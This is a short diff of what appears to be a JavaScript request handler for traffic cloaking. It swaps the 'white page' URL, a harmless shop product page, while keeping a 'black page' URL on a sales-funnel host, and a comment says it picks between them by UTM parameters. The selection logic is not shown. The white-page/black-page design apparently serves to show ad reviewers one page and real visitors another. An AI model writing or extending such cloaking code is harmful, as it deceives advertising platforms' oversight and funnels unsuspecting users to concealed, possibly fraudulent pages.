@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.polkadots.pk/products/full-sleeves-printed-t-shirt-13204pd?srsltid=AfmBOooTIN0O35Q_FqMDAEDrhvbRIeB1BFaxhhpYTlCEAL_VgGOQ5EDI";
+    const whitePageURL = "https://megathriftstore.pk/products/wt-3863";
     const blackPageURL = "https://ifrxjwhbvb.myfunnelish.com/imbassd-1735569734063202-1735754211879216";
   
     // Parse the UTM parameters from the request URL
